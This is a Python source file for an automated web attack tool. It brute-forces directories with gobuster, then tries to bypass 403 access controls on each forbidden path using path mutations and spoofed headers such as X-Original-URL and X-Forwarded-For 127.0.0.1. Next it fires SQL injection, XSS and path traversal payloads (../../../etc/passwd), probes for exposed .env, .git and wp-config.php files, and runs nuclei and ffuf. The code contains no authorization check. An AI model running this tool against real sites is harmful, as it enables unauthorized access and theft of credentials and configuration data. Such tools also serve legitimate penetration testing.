import subprocess
import requests
import sys
import os
import re
import json
import threading
from urllib.parse import urljoin

def try_bypass(url, path, orig_len, output_file):
    test_paths = [
        path,
        path + '/',
        path + '%2e/',
        path + '%20',
        path + '.json',
        path + '.php',
        path + '.html',
        '/' + path + '/../',
        '//' + path + '//',
        '/./' + path + '/./',
        # Advanced payloads
        path.upper(),
        path.lower(),
        path.title(),
        path + '%u002e',
        path + '%u002f',
        path + '?HTTP/1.0',
        path + '?HTTP/1.1',
        path + '?test=1&test=2',
        path + '??',
        path + '?&',
        path + '?transfer-encoding=chunked',
        path + '?cache=1',
        path + '?version=1',
    ]

    headers_list = [
        {},
        {'X-Original-URL': path},
        {'X-Rewrite-URL': path},
        {'X-Custom-IP-Authorization': '127.0.0.1'},
        {'X-Forwarded-For': '127.0.0.1'},
        {'X-Forwarded-For': 'localhost'},
        {'X-Real-IP': '127.0.0.1'},
        {'X-Originating-IP': '127.0.0.1'},
        {'X-Remote-IP': '127.0.0.1'},
        {'X-Remote-Addr': '127.0.0.1'},
        {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
        {'Referer': url},
        # Advanced headers
        {'X-Forwarded-Host': 'localhost'},
        {'X-Forwarded-Server': 'localhost'},
        {'X-Host': 'localhost'},
        {'X-HTTP-Host-Override': 'localhost'},
        {'Forwarded': 'for=127.0.0.1;host=localhost;proto=http'},
        {'X-Forwarded-Proto': 'http'},
        {'X-Forwarded-Protocol': 'http'},
        {'X-Forwarded-Scheme': 'http'},
        {'X-URL-Scheme': 'http'},
        {'Base-Url': url},
        {'X-HTTP-Method-Override': 'GET'},
        {'X-Method-Override': 'GET'},
        {'CF-Connecting-IP': '127.0.0.1'},
        {'True-Client-IP': '127.0.0.1'},
        {'Client-IP': '127.0.0.1'},
        {'X-Client-IP': '127.0.0.1'},
        {'X-Cluster-Client-IP': '127.0.0.1'},
    ]

    methods = ['GET', 'POST', 'PUT', 'OPTIONS', 'HEAD']
    seen_responses = set()  # To deduplicate logs per path

    for method in methods:
        for test_path in test_paths:
            full_url = url.rstrip('/') + '/' + test_path.lstrip('/')
            for headers in headers_list:
                try:
                    if method == 'GET':
                        r = requests.get(full_url, headers=headers, timeout=5, allow_redirects=False)
                    elif method == 'POST':
                        r = requests.post(full_url, headers=headers, timeout=5, allow_redirects=False)
                    elif method == 'PUT':
                        r = requests.put(full_url, headers=headers, timeout=5, allow_redirects=False)
                    elif method == 'OPTIONS':
                        r = requests.options(full_url, headers=headers, timeout=5, allow_redirects=False)
                    elif method == 'HEAD':
                        r = requests.head(full_url, headers=headers, timeout=5, allow_redirects=False)

                    content_length = r.headers.get('Content-Length', '0')

                    if r.status_code not in [403, 404, 400]:
                        msg_key = f"{method}_{full_url}_{r.status_code}"
                        if msg_key not in seen_responses:
                            seen_responses.add(msg_key)
                            msg = f"[SUCCESS] [{method}] [{r.status_code}] {full_url} | Headers: {headers}\n"
                            print(msg.strip())
                            with open(output_file, 'a') as f:
                                f.write(msg)
                    elif r.status_code == 403 and content_length != str(orig_len):
                        msg_key = f"403_{full_url}_{content_length}"
                        if msg_key not in seen_responses:
                            seen_responses.add(msg_key)
                            msg = f"[DIFFERENT 403] [{method}] {full_url} | Length: {content_length}\n"
                            print(msg.strip())
                            with open(output_file, 'a') as f:
                                f.write(msg)

                except Exception:
                    pass

def enhanced_bypass(url, path, orig_len, output_file):
    """Enhanced bypass with more sophisticated techniques"""
    advanced_payloads = [
        # Case variation
        path.upper(),
        path.lower(),
        path.title(),

        # Unicode normalization
        path + '%u002e',
        path + '%u002f',

        # HTTP version switching
        path + '?HTTP/1.0',
        path + '?HTTP/1.1',

        # Parameter pollution
        path + '?test=1&test=2',
        path + '??',
        path + '?&',

        # Chunked encoding bypass
        path + '?transfer-encoding=chunked',

        # Cache poisoning techniques
        path + '?cache=1',
        path + '?version=1',
    ]

    advanced_headers = [
        {'X-Forwarded-Host': 'localhost'},
        {'X-Forwarded-Server': 'localhost'},
        {'X-Host': 'localhost'},
        {'X-HTTP-Host-Override': 'localhost'},
        {'Forwarded': 'for=127.0.0.1;host=localhost;proto=http'},
        {'X-Forwarded-Proto': 'http'},
        {'X-Forwarded-Protocol': 'http'},
        {'X-Forwarded-Scheme': 'http'},
        {'X-URL-Scheme': 'http'},
        {'Base-Url': url},
        {'X-Original-URL': path},
        {'X-Rewrite-URL': path},
        # Method override headers
        {'X-HTTP-Method-Override': 'GET'},
        {'X-Method-Override': 'GET'},
        # Cloudflare bypass
        {'CF-Connecting-IP': '127.0.0.1'},
        {'True-Client-IP': '127.0.0.1'},
        # Custom headers
        {'Client-IP': '127.0.0.1'},
        {'X-Client-IP': '127.0.0.1'},
        {'X-Cluster-Client-IP': '127.0.0.1'},
    ]

    methods = ['GET', 'POST', 'PUT', 'OPTIONS', 'HEAD']
    seen_responses = set()  # To deduplicate logs per path

    for method in methods:
        for payload in advanced_payloads:
            full_url = url.rstrip('/') + '/' + payload.lstrip('/')
            for headers in advanced_headers:
                try:
                    if method == 'GET':
                        r = requests.get(full_url, headers=headers, timeout=5, allow_redirects=False)
                    elif method == 'POST':
                        r = requests.post(full_url, headers=headers, timeout=5, allow_redirects=False)
                    elif method == 'PUT':
                        r = requests.put(full_url, headers=headers, timeout=5, allow_redirects=False)
                    elif method == 'OPTIONS':
                        r = requests.options(full_url, headers=headers, timeout=5, allow_redirects=False)
                    elif method == 'HEAD':
                        r = requests.head(full_url, headers=headers, timeout=5, allow_redirects=False)

                    content_length = r.headers.get('Content-Length', '0')

                    if r.status_code not in [403, 404, 400]:
                        msg_key = f"{method}_{full_url}_{r.status_code}"
                        if msg_key not in seen_responses:
                            seen_responses.add(msg_key)
                            msg = f"[ENHANCED SUCCESS] [{method}] [{r.status_code}] {full_url} | Headers: {headers}\n"
                            print(msg.strip())
                            with open(output_file, 'a') as f:
                                f.write(msg)
                    elif r.status_code == 403 and content_length != str(orig_len):
                        msg_key = f"403_{full_url}_{content_length}"
                        if msg_key not in seen_responses:
                            seen_responses.add(msg_key)
                            msg = f"[ENHANCED DIFFERENT 403] [{method}] {full_url} | Length: {content_length}\n"
                            print(msg.strip())
                            with open(output_file, 'a') as f:
                                f.write(msg)

                except Exception:
                    pass

def run_gobuster(url, wordlist, output_file):
    msg = f"\n[*] Starting Gobuster scan on {url}\n[*] Using wordlist: {wordlist}\n[*] This may take a while...\n"
    print(msg.strip())
    with open(output_file, 'a') as f:
        f.write(msg)

    try:
        gobuster_cmd = [
            'gobuster', 'dir',
            '-u', url,
            '-w', wordlist,
            '-t', '50',
            '--exclude-length', '34083',
            '-s', '200,204,301,302,307,401,403,500',
            '-b', ''
        ]

        process = subprocess.Popen(gobuster_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1)

        def print_stderr():
            for line in process.stderr:
                err_msg = "[GOBUSTER STDERR] " + line.strip() + "\n"
                print(err_msg.strip())
                with open(output_file, 'a') as f:
                    f.write(err_msg)

        threading.Thread(target=print_stderr, daemon=True).start()

        found_403_paths = []

        for line in process.stdout:
            line = line.strip()
            if not line:
                continue
            print(line)
            with open(output_file, 'a') as f:
                f.write(line + '\n')
            try:
                # Updated regex to capture size
                match = re.match(r'^(/[\S]+)\s+\(Status:\s+(\d+)\)\s+\[Size:\s+(\d+)\]', line)
                if match:
                    path = match.group(1)
                    status = int(match.group(2))
                    size = int(match.group(3))
                    full_url = url.rstrip('/') + path

                    if status in [200, 204, 301, 302, 307, 401, 500]:
                        msg = f"[FOUND] [{status}] {full_url}\n"
                        print(msg.strip())
                        with open(output_file, 'a') as f:
                            f.write(msg)
                    elif status == 403:
                        msg = f"[403 FOUND] {full_url} (Size: {size})\n"
                        print(msg.strip())
                        with open(output_file, 'a') as f:
                            f.write(msg)
                        found_403_paths.append((path.lstrip('/'), size))
            except Exception:
                pass

        process.wait()

        if process.returncode != 0:
            msg = f"[ERROR] Gobuster exited with code {process.returncode}\n"
            print(msg.strip())
            with open(output_file, 'a') as f:
                f.write(msg)

        if found_403_paths:
            msg = "\n[*] Testing bypass methods for found 403 paths...\n"
            print(msg.strip())
            with open(output_file, 'a') as f:
                f.write(msg)
            for path, orig_len in found_403_paths:
                msg = f"[*] Testing {path} (orig len: {orig_len}) ...\n"
                print(msg.strip())
                with open(output_file, 'a') as f:
                    f.write(msg)
                try_bypass(url, path, orig_len, output_file)
                enhanced_bypass(url, path, orig_len, output_file)

    except FileNotFoundError:
        msg = "[ERROR] Gobuster not found. Make sure it's installed in your PATH.\n"
        print(msg.strip())
        with open(output_file, 'a') as f:
            f.write(msg)
    except Exception as e:
        msg = f"[ERROR] {e}\n"
        print(msg.strip())
        with open(output_file, 'a') as f:
            f.write(msg)

def get_found_endpoints(output_file):
    """Extract found endpoints from output file"""
    endpoints = []
    with open(output_file, 'r') as f:
        for line in f:
            if any(marker in line for marker in ['[SUCCESS]', '[FOUND]', '[ENHANCED SUCCESS]']):
                url_match = re.search(r'(https?://[^\s|]+)', line)
                if url_match:
                    endpoints.append(url_match.group(1))
    return list(set(endpoints))  # Remove duplicates

def log_vulnerability(vuln_type, url, output_file):
    msg = f"[VULNERABLE] {vuln_type} found at: {url}\n"
    print(msg.strip())
    with open(output_file, 'a') as f:
        f.write(msg)

def log_finding(finding, output_file):
    msg = f"[FINDING] {finding}\n"
    print(msg.strip())
    with open(output_file, 'a') as f:
        f.write(msg)

def vulnerability_assessment(url, output_file):
    """Test for common vulnerabilities on accessible endpoints"""

    # SQL Injection testing
    sqli_payloads = ["'", "';", "' OR '1'='1", "' UNION SELECT 1,2,3--"]

    # XSS testing
    xss_payloads = ["<script>alert(1)</script>", "\"><script>alert(1)</script>"]

    # Path traversal
    traversal_payloads = ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"]

    # Test each found endpoint
    for endpoint in get_found_endpoints(output_file):
        test_url = endpoint

        # SQLi test
        for payload in sqli_payloads:
            test_param_url = test_url + ('?' if '?' not in test_url else '&') + f'test={payload}'
            try:
                r = requests.get(test_param_url, timeout=5)
                if any(error in r.text.lower() for error in ['sql', 'mysql', 'ora-', 'syntax']):
                    log_vulnerability('SQL Injection', test_param_url, output_file)
            except:
                pass

        # XSS test
        for payload in xss_payloads:
            test_param_url = test_url + ('?' if '?' not in test_url else '&') + f'q={payload}'
            try:
                r = requests.get(test_param_url, timeout=5)
                if payload in r.text:
                    log_vulnerability('XSS', test_param_url, output_file)
            except:
                pass

        # Path traversal test
        for payload in traversal_payloads:
            test_traversal_url = test_url + ('/' if not test_url.endswith('/') else '') + payload
            try:
                r = requests.get(test_traversal_url, timeout=5)
                if 'root:' in r.text or '[extensions]' in r.text:
                    log_vulnerability('Path Traversal', test_traversal_url, output_file)
            except:
                pass

def content_discovery(url, output_file):
    """Discover and analyze content on accessible endpoints"""

    endpoints = get_found_endpoints(output_file)

    for endpoint in endpoints:
        full_url = endpoint

        # Check for backup files
        backup_extensions = ['.bak', '.backup', '.old', '.txt', '.orig', '.save']
        for ext in backup_extensions:
            test_url = full_url + ext
            try:
                r = requests.get(test_url, timeout=5)
                if r.status_code == 200:
                    log_finding(f"Backup file found: {test_url}", output_file)
            except:
                pass

        # Check for directory listing
        try:
            r = requests.get(full_url, timeout=5)
            if any(indicator in r.text.lower() for indicator in ['index of', 'parent directory', '<title>directory']):
                log_finding(f"Directory listing enabled: {full_url}", output_file)
        except:
            pass

        # Check for exposed files
        sensitive_files = ['.git/', '.env', 'wp-config.php', 'config.php', 'web.config', 'robots.txt']
        base_url = url.rstrip('/')
        for file in sensitive_files:
            test_url = base_url + '/' + file
            try:
                r = requests.get(test_url, timeout=5)
                if r.status_code == 200:
                    log_finding(f"Sensitive file exposed: {test_url}", output_file)
            except:
                pass

def follow_up_scan(found_urls, output_file):
    """Perform deeper scans on found endpoints"""

    tools = {
        'nuclei': {
            'cmd': ['nuclei', '-u', '{}', '-t', '~/nuclei-templates/'],
            'description': 'Vulnerability scanning'
        },
        'ffuf': {
            'cmd': ['ffuf', '-w', '/usr/share/seclists/Discovery/Web-Content/big.txt', '-u', '{}/FUZZ', '-fc', '403'],
            'description': 'Deep directory bruteforcing'
        }
    }

    for url in found_urls:
        print(f"\n[*] Performing follow-up scans on: {url}")

        for tool, config in tools.items():
            try:
                if tool == 'nuclei':
                    cmd = [part.format(url) if '{}' in part else part for part in config['cmd']]
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

                    if result.stdout:
                        with open(output_file, 'a') as f:
                            f.write(f"\n[+] {tool.upper()} Results for {url}:\n")
                            f.write(result.stdout + "\n")
                        print(f"[+] {tool} found issues for {url}")

                elif tool == 'ffuf':
                    # Only run ffuf on directory-like URLs
                    if url.endswith('/'):
                        cmd = [part.format(url) if '{}' in part else part for part in config['cmd']]
                        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

                        if result.stdout:
                            with open(output_file, 'a') as f:
                                f.write(f"\n[+] {tool.upper()} Results for {url}:\n")
                                f.write(result.stdout + "\n")
                            print(f"[+] {tool} found content for {url}")

            except subprocess.TimeoutExpired:
                print(f"[-] {tool} timed out for {url}")
            except FileNotFoundError:
                print(f"[-] {tool} not installed, skipping")
            except Exception as e:
                print(f"[-] {tool} failed: {e}")

def generate_report(output_file):
    """Generate a comprehensive report"""

    with open(output_file, 'r') as f:
        content = f.read()

    report_data = {
        'bypassed_urls': re.findall(r'\[SUCCESS\].*?(http[s]?://[^\s|]+)', content),
        'enhanced_bypassed_urls': re.findall(r'\[ENHANCED SUCCESS\].*?(http[s]?://[^\s|]+)', content),
        'different_403s': re.findall(r'\[(?:DIFFERENT|ENHANCED DIFFERENT) 403\].*?(http[s]?://[^\s]+)', content),
        'found_endpoints': re.findall(r'\[FOUND\].*?(http[s]?://[^\s]+)', content),
        'vulnerabilities': re.findall(r'\[VULNERABLE\].*?(http[s]?://[^\s]+)', content),
        'findings': re.findall(r'\[FINDING\].*', content),
    }

    # Generate HTML report
    html_report = f"""
    <html>
    <head>
        <title>403 Bypass Scan Report</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 40px; }}
            h1 {{ color: #333; }}
            h2 {{ color: #555; margin-top: 30px; }}
            ul {{ list-style-type: none; padding: 0; }}
            li {{ padding: 5px; margin: 2px 0; background: #f5f5f5; }}
            .success {{ background: #d4edda; }}
            .warning {{ background: #fff3cd; }}
            .danger {{ background: #f8d7da; }}
            .info {{ background: #d1ecf1; }}
        </style>
    </head>
    <body>
        <h1>403 Bypass Scan Report</h1>

        <h2>Successfully Bypassed ({len(report_data['bypassed_urls'])}):</h2>
        <ul>
        {"".join(f'<li class="success">{url}</li>' for url in report_data['bypassed_urls'])}
        </ul>

        <h2>Enhanced Bypass Success ({len(report_data['enhanced_bypassed_urls'])}):</h2>
        <ul>
        {"".join(f'<li class="success">{url}</li>' for url in report_data['enhanced_bypassed_urls'])}
        </ul>

        <h2>Interesting 403s ({len(report_data['different_403s'])}):</h2>
        <ul>
        {"".join(f'<li class="warning">{url}</li>' for url in report_data['different_403s'])}
        </ul>

        <h2>Found Endpoints ({len(report_data['found_endpoints'])}):</h2>
        <ul>
        {"".join(f'<li class="info">{url}</li>' for url in report_data['found_endpoints'])}
        </ul>

        <h2>Vulnerabilities Found ({len(report_data['vulnerabilities'])}):</h2>
        <ul>
        {"".join(f'<li class="danger">{url}</li>' for url in report_data['vulnerabilities'])}
        </ul>

        <h2>Other Findings ({len(report_data['findings'])}):</h2>
        <ul>
        {"".join(f'<li>{finding}</li>' for finding in report_data['findings'])}
        </ul>
    </body>
    </html>
    """

    report_filename = output_file.replace('.txt', '_report.html')
    with open(report_filename, 'w') as f:
        f.write(html_report)

    print(f"[+] Comprehensive report generated: {report_filename}")

def analyze_results(output_file):
    """Perform final analysis on results"""
    with open(output_file, 'r') as f:
        content = f.read()

    total_bypassed = len(re.findall(r'\[SUCCESS\]', content)) + len(re.findall(r'\[ENHANCED SUCCESS\]', content))
    total_found = len(re.findall(r'\[FOUND\]', content))
    total_vulnerabilities = len(re.findall(r'\[VULNERABLE\]', content))

    print(f"\n{'='*50}")
    print(f"SCAN SUMMARY")
    print(f"{'='*50}")
    print(f"Total endpoints found: {total_found}")
    print(f"Total bypasses successful: {total_bypassed}")
    print(f"Total vulnerabilities found: {total_vulnerabilities}")
    print(f"{'='*50}")

def run_full_scan(url, wordlist, output_file):
    """
    Runs the full scan process.
    """
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    if not output_file.endswith('.txt'):
        output_file += '.txt'
    output_file = os.path.join(os.getcwd(), output_file)

    with open(output_file, 'w') as f:
        f.write(f"Scan started on {url} with wordlist {wordlist}\n")
        f.write("=" * 50 + "\n")

    # Phase 1: Initial scanning
    run_gobuster(url, wordlist, output_file)

    # Phase 2: Enhanced scanning
    print("\n[*] Starting enhanced scanning phase...")

    # Get found endpoints and perform deeper scans
    found_urls = get_found_endpoints(output_file)

    if found_urls:
        print(f"[*] Found {len(found_urls)} endpoints for further analysis")

        # Vulnerability assessment
        print("[*] Starting vulnerability assessment...")
        vulnerability_assessment(url, output_file)

        # Content discovery
        print("[*] Starting content discovery...")
        content_discovery(url, output_file)

        # Follow-up scanning
        print("[*] Starting follow-up scans...")
        follow_up_scan(found_urls, output_file)

        # Generate reports
        print("[*] Generating reports...")
        generate_report(output_file)
    else:
        print("[-] No endpoints found for enhanced scanning")

    # Final analysis
    analyze_results(output_file)

    msg = "\n[*] Complete scan finished. Check results and report files.\n"
    print(msg)
    with open(output_file, 'a') as f:
        f.write(msg)
